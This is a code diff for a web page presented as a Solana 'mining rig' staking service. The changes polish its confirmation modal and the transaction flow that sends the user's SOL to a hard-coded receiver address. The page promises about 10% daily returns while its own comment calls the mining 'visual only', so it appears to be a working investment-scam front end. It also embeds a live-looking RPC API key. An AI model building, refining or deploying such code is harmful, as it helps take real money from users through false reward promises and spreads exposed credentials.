@@ -23,6 +23,7 @@
             --accent-blue: #0088ff;
             --success-green: #00ffaa;
             --warning-gold: #ffd700;
+            --error-red: #ff4d4d;
             --spacing-xs: clamp(0.25rem, 1vw, 0.5rem);
             --spacing-sm: clamp(0.5rem, 2vw, 0.75rem);
             --spacing-md: clamp(0.75rem, 3vw, 1rem);
@@ -210,12 +211,10 @@
             box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
         }
 
-        .btn-block {
-            width: 100%;
-        }
-
-        .btn-icon {
-            font-size: var(--font-size-lg);
+        .btn-danger {
+            background: rgba(255, 80, 80, 0.2);
+            border-color: #ff4d4d;
+            color: #ffb3b3;
         }
 
         .stats-grid {
@@ -486,6 +485,48 @@
         .feed-item .info { color: var(--accent-cyan); }
         .feed-item .warning { color: #ff6b6b; }
 
+        /* Transaction Status Toast */
+        .transaction-status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            max-width: 350px;
+            padding: 16px 20px;
+            border-radius: 12px;
+            background: rgba(10, 25, 40, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border-color);
+            color: white;
+            font-size: 14px;
+            z-index: 2000;
+            display: none;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            animation: slideIn 0.3s ease;
+        }
+
+        .transaction-status.success {
+            border-left: 4px solid var(--success-green);
+        }
+
+        .transaction-status.error {
+            border-left: 4px solid var(--error-red);
+        }
+
+        .transaction-status.info {
+            border-left: 4px solid var(--accent-cyan);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -550,6 +591,7 @@
             word-break: break-word;
             border: 1px solid #214767;
             font-size: var(--font-size-sm);
+            white-space: pre-wrap;
         }
 
         .modal-footer {
@@ -737,15 +779,36 @@
         </div>
     </div>
 
-    <!-- Transaction Modal (REAL CONFIRMATION) -->
+    <!-- Transaction Status Toast -->
+    <div id="transactionStatus" class="transaction-status"></div>
+
+    <!-- Confirmation Modal -->
+    <div class="modal-overlay" id="confirmModal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <i class="fa-solid fa-circle-check" style="color: var(--warning-gold);"></i>
+                <h3>CONFIRM STAKE</h3>
+            </div>
+            <div class="modal-body">
+                <div id="confirmMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);"></div>
+                <div class="modal-detail" id="confirmDetail"></div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-danger" id="cancelConfirmBtn">CANCEL</button>
+                <button class="btn btn-primary" id="approveConfirmBtn">APPROVE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Transaction Progress Modal -->
     <div class="modal-overlay" id="txModal">
         <div class="modal-card">
             <div class="modal-header">
                 <i class="fa-solid fa-bolt"></i>
-                <h3>REAL MINING TX</h3>
+                <h3 id="txModalTitle">TRANSACTION</h3>
             </div>
             <div class="modal-body">
-                <div id="modalMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);">processing...</div>
+                <div id="modalMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);"></div>
                 <div class="modal-detail" id="modalDetail"></div>
             </div>
             <div class="modal-footer">
@@ -757,7 +820,7 @@
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
 
-    <!-- Firebase + Application Logic (NO BUFFER, REAL CONFIRMATION) -->
+    <!-- Firebase + Application Logic -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
         import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
@@ -776,9 +839,8 @@
         const db = getFirestore(fbApp);
 
         const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
-        const MIN_STAKE_SOL = 0.5; // Minimum 0.5 SOL (~$100 USD)
+        const MIN_STAKE_SOL = 0.5;
         
-        // Helius RPC for reliable mainnet connection
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
         
         let phantom = null;
@@ -804,10 +866,21 @@
         const hashRateSpan = document.getElementById('hashRate');
         const miningFeed = document.getElementById('miningFeed');
         const lastUpdateSpan = document.getElementById('lastUpdateTimestamp');
-        const modalOverlay = document.getElementById('txModal');
+        
+        // Modal elements
+        const confirmModal = document.getElementById('confirmModal');
+        const confirmMessage = document.getElementById('confirmMessage');
+        const confirmDetail = document.getElementById('confirmDetail');
+        const cancelConfirmBtn = document.getElementById('cancelConfirmBtn');
+        const approveConfirmBtn = document.getElementById('approveConfirmBtn');
+        
+        const txModal = document.getElementById('txModal');
+        const txModalTitle = document.getElementById('txModalTitle');
         const modalMessage = document.getElementById('modalMessage');
         const modalDetail = document.getElementById('modalDetail');
         const modalClose = document.getElementById('modalCloseBtn');
+        
+        const transactionStatus = document.getElementById('transactionStatus');
 
         // Quick stake buttons
         const quickStake0_5 = document.getElementById('quickStake0_5');
@@ -816,15 +889,57 @@
         const quickStake10 = document.getElementById('quickStake10');
 
         // Helper Functions
-        function showModal(title, detail) {
-            modalMessage.innerText = title;
-            modalDetail.innerText = detail;
-            modalOverlay.classList.add('active');
+        function showTransactionStatus(message, type = 'info') {
+            transactionStatus.textContent = message;
+            transactionStatus.className = 'transaction-status ' + type;
+            transactionStatus.style.display = 'block';
+            
+            // Auto hide after 5 seconds for success/info, keep errors visible longer
+            setTimeout(() => {
+                transactionStatus.style.display = 'none';
+            }, type === 'error' ? 8000 : 5000);
         }
 
-        modalClose.addEventListener('click', () => {
-            modalOverlay.classList.remove('active');
-        });
+        function showConfirmModal(message, detail) {
+            confirmMessage.innerText = message;
+            confirmDetail.innerText = detail;
+            confirmModal.classList.add('active');
+            return new Promise((resolve) => {
+                const onApprove = () => {
+                    cleanup();
+                    resolve(true);
+                };
+                const onCancel = () => {
+                    cleanup();
+                    resolve(false);
+                };
+                const cleanup = () => {
+                    confirmModal.classList.remove('active');
+                    approveConfirmBtn.removeEventListener('click', onApprove);
+                    cancelConfirmBtn.removeEventListener('click', onCancel);
+                };
+                approveConfirmBtn.addEventListener('click', onApprove, { once: true });
+                cancelConfirmBtn.addEventListener('click', onCancel, { once: true });
+            });
+        }
+
+        function showTxModal(title, message, detail) {
+            txModalTitle.innerText = title;
+            modalMessage.innerText = message;
+            modalDetail.innerText = detail;
+            txModal.classList.add('active');
+        }
+
+        function updateTxModal(message, detail) {
+            modalMessage.innerText = message;
+            if (detail) modalDetail.innerText = detail;
+        }
+
+        function hideTxModal() {
+            txModal.classList.remove('active');
+        }
+
+        modalClose.addEventListener('click', hideTxModal);
 
         function formatAddr(addr) {
             if (!addr) return '';
@@ -992,7 +1107,7 @@
         }
 
         // Add stake and update Firestore
-        async function addStakeToFirestore(amountSol) {
+        async function addStakeToFirestore(amountSol, signature) {
             if (!userDocRef || !walletAddress) return;
             
             const snap = await getDoc(userDocRef);
@@ -1003,11 +1118,14 @@
             
             await updateDoc(userDocRef, {
                 totalStaked: newTotal,
-                lastDailyUpdate: Date.now()
+                lastDailyUpdate: Date.now(),
+                lastTransaction: signature,
+                lastTransactionTime: serverTimestamp()
             });
             
             await refreshUserStats();
             addToFeed(`📦 +${amountSol} SOL added to mining rig`, 'success');
+            addToFeed(`✅ tx: ${signature.slice(0,12)}...`, 'success');
         }
 
         // Connect Phantom
@@ -1055,33 +1173,51 @@
                 
             } catch (err) {
                 console.error('Connection error:', err);
-                alert('Failed to connect: ' + err.message);
+                showTransactionStatus('Failed to connect: ' + err.message, 'error');
                 connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">CONNECT PHANTOM</span>';
             }
         }
 
-        // REAL TRANSACTION: Send stake with wallet confirmation (NO BUFFER)
+        // REAL TRANSACTION: Send stake with wallet confirmation
         async function sendStake(amount = null) {
             if (!walletAddress || !phantom) {
-                alert("Connect your mining rig first");
+                showTransactionStatus("Connect your mining rig first", 'error');
                 return;
             }
 
             const stakeAmount = amount || parseFloat(stakeAmountInput.value);
             
-            // Validate minimum stake (0.5 SOL = ~$100)
+            // Validate minimum stake
             if (isNaN(stakeAmount) || stakeAmount < MIN_STAKE_SOL) {
-                alert(`Minimum stake is ${MIN_STAKE_SOL} SOL (~$${(MIN_STAKE_SOL * 200).toFixed(0)} USD)`);
+                showTransactionStatus(`Minimum stake is ${MIN_STAKE_SOL} SOL`, 'error');
                 return;
             }
 
-            // Show modal immediately – user must approve in wallet
-            showModal("⛏️ AWAITING WALLET APPROVAL", `Amount: ${stakeAmount} SOL\n\nPlease approve the transaction in your Phantom wallet.\n\nAfter approval, we wait for blockchain confirmation.`);
+            // Step 1: Show confirmation modal (like the example with showCustomAlert)
+            const tierInfo = calculateTier(parseFloat(totalStakedSpan.innerText) || 0);
+            const estimatedDailyReward = stakeAmount * 0.1 * tierInfo.boost;
+            
+            const confirmed = await showConfirmModal(
+                "Confirm Mining Stake",
+                `Amount: ${stakeAmount} SOL\n` +
+                `Daily Reward: ${estimatedDailyReward.toFixed(4)} SOL\n` +
+                `Tier Boost: ${tierInfo.boost}x\n\n` +
+                `Confirm to proceed with the transaction in your wallet.`
+            );
 
+            if (!confirmed) {
+                showTransactionStatus('Transaction cancelled by user', 'info');
+                addToFeed('⚠️ stake cancelled by user', 'warning');
+                return;
+            }
+
+            // Step 2: Initiate Solana Transaction
             try {
-                if (!phantom.publicKey) {
-                    await phantom.connect();
-                }
+                showTxModal(
+                    "⛏️ PROCESSING TRANSACTION",
+                    "Preparing transaction...",
+                    `Amount: ${stakeAmount} SOL\nPlease approve in your wallet.`
+                );
 
                 addToFeed('📝 creating transaction...', 'info');
 
@@ -1089,94 +1225,95 @@
                 const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                 
                 // Get latest blockhash
-                let blockhash, lastValidBlockHeight;
-                try {
-                    const result = await connection.getLatestBlockhash('finalized');
-                    blockhash = result.blockhash;
-                    lastValidBlockHeight = result.lastValidBlockHeight;
-                } catch (blockhashError) {
-                    console.error('Blockhash error:', blockhashError);
-                    // Fallback to public RPC
-                    const publicConnection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-                    const result = await publicConnection.getLatestBlockhash('finalized');
-                    blockhash = result.blockhash;
-                    lastValidBlockHeight = result.lastValidBlockHeight;
-                }
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
 
                 // Create the transfer instruction
+                const fromWalletPublicKey = new solanaWeb3.PublicKey(walletAddress);
+                const toWalletPublicKey = new solanaWeb3.PublicKey(RECEIVER_ADDRESS);
+                const lamports = Math.floor(stakeAmount * solanaWeb3.LAMPORTS_PER_SOL);
+
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: phantom.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
-                        lamports: Math.floor(stakeAmount * solanaWeb3.LAMPORTS_PER_SOL)
+                        fromPubkey: fromWalletPublicKey,
+                        toPubkey: toWalletPublicKey,
+                        lamports: lamports,
                     })
                 );
                 
                 transaction.recentBlockhash = blockhash;
-                transaction.feePayer = phantom.publicKey;
+                transaction.feePayer = fromWalletPublicKey;
 
-                // Update modal to tell user to approve in wallet
-                modalMessage.innerText = "🔐 APPROVE IN WALLET";
-                modalDetail.innerText = `Please approve this transaction in your Phantom wallet:\n\nAmount: ${stakeAmount} SOL\nTo: ${RECEIVER_ADDRESS.slice(0,8)}...${RECEIVER_ADDRESS.slice(-8)}\n\nWaiting for your approval...`;
+                updateTxModal(
+                    "🔐 APPROVE IN WALLET",
+                    `Please approve this transaction in your Phantom wallet.\n\nAmount: ${stakeAmount} SOL\nTo: ${formatAddr(RECEIVER_ADDRESS)}\n\nWaiting for your approval...`
+                );
 
                 addToFeed('⏳ waiting for wallet approval...', 'info');
 
-                // This triggers the Phantom wallet popup for REAL confirmation
-                const { signature } = await phantom.signAndSendTransaction(transaction);
-                
-                modalMessage.innerText = "⏳ TRANSACTION SENT, CONFIRMING...";
-                modalDetail.innerText = `Transaction Signature:\n${signature}\n\nWaiting for blockchain confirmation...\n\nThis may take 10-30 seconds.`;
+                // Prompt user to sign and send transaction via wallet extension
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+
+                updateTxModal(
+                    "⏳ CONFIRMING TRANSACTION",
+                    `Transaction Signature:\n${signature}\n\nWaiting for blockchain confirmation...`
+                );
                 
                 addToFeed(`📤 tx sent: ${signature.slice(0,8)}...`, 'mining');
                 
-                // Wait for confirmation on blockchain
-                const confirmation = await connection.confirmTransaction({
+                // Wait for transaction confirmation
+                const { value: status } = await connection.confirmTransaction({
                     signature,
                     blockhash,
                     lastValidBlockHeight
                 }, 'confirmed');
 
-                if (confirmation.value.err) {
-                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(confirmation.value.err));
+                if (status.err) {
+                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(status.err));
                 }
-                
+
                 // Transaction confirmed! Update Firebase
-                await addStakeToFirestore(stakeAmount);
+                await addStakeToFirestore(stakeAmount, signature);
                 
-                modalMessage.innerText = "✅ MINING STARTED!";
-                modalDetail.innerText = `🎉 Transaction Confirmed!\n\nSignature: ${signature}\n\nAmount Staked: ${stakeAmount} SOL\nValue: ~$${(stakeAmount * 200).toFixed(2)} USD\n\nStatus: ✓ Confirmed on Solana\nYour mining rig is now active and generating rewards!`;
+                // Show success
+                showTransactionStatus(`✅ Success! Staked ${stakeAmount} SOL`, 'success');
+                
+                updateTxModal(
+                    "✅ MINING STARTED!",
+                    `🎉 Transaction Confirmed!\n\nSignature: ${signature}\n\nAmount Staked: ${stakeAmount} SOL\nStatus: ✓ Confirmed on Solana`,
+                    `Transaction successful! Your mining rig is now active.`
+                );
                 
                 addToFeed(`⛏️ ${stakeAmount} SOL staked successfully!`, 'success');
-                addToFeed(`✅ confirmed: ${signature.slice(0,12)}...`, 'success');
                 
-                // Refresh all stats
+                // Refresh stats
                 await refreshUserStats();
                 
-            } catch (err) {
-                console.error('Transaction error:', err);
-                modalMessage.innerText = "❌ TRANSACTION FAILED";
+            } catch (error) {
+                console.error("Solana transaction failed:", error);
                 
-                let errorMsg = 'Transaction failed.';
-                
-                if (err.message.includes('User rejected')) {
-                    errorMsg = '❌ You rejected the transaction in your Phantom wallet.\n\nNo funds were transferred.';
+                let errorMessage = "❌ Transaction failed. ";
+                if (error.message.includes('User rejected')) {
+                    errorMessage += "You rejected the transaction in your wallet.";
                     addToFeed('⚠️ transaction rejected by user', 'warning');
-                } else if (err.message.includes('insufficient')) {
-                    errorMsg = '❌ Insufficient SOL balance.\n\nPlease make sure you have enough SOL to cover the stake amount plus network fees (~0.000005 SOL).';
+                } else if (error.message.includes('insufficient lamports')) {
+                    errorMessage += "Insufficient SOL balance in your wallet.";
                     addToFeed('⚠️ insufficient balance', 'warning');
-                } else if (err.message.includes('Attempt to debit')) {
-                    errorMsg = '❌ Insufficient balance.\n\nYou need more SOL in your wallet.';
-                    addToFeed('⚠️ insufficient funds', 'warning');
                 } else {
-                    errorMsg = `❌ Transaction Error:\n\n${err.message}`;
+                    errorMessage += error.message;
                     addToFeed('⚠️ transaction failed', 'warning');
                 }
                 
-                modalDetail.innerText = errorMsg;
+                showTransactionStatus(errorMessage, 'error');
+                
+                updateTxModal(
+                    "❌ TRANSACTION FAILED",
+                    errorMessage,
+                    "Please try again or contact support if the issue persists."
+                );
             }
         }
 
-        // Mining simulation (visual only, does not affect real balance)
+        // Mining simulation (visual only)
         function startMiningSimulation() {
             if (miningInterval) clearInterval(miningInterval);
             
